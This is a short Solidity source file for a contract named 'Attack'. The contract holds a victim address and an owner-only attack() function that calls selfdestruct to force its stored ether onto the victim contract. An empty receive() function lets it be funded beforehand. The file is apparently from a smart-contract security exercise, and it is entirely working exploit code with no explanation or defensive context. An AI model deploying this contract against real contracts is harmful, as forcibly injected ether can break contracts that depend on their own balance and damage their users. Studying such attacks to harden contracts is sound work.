// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack {
    address public victimAddress;
    address public owner;
    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
        owner = msg.sender;    
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function attack() external onlyOwner {
        selfdestruct(payable(victimAddress));
    }

    receive() external payable {
        
    }
}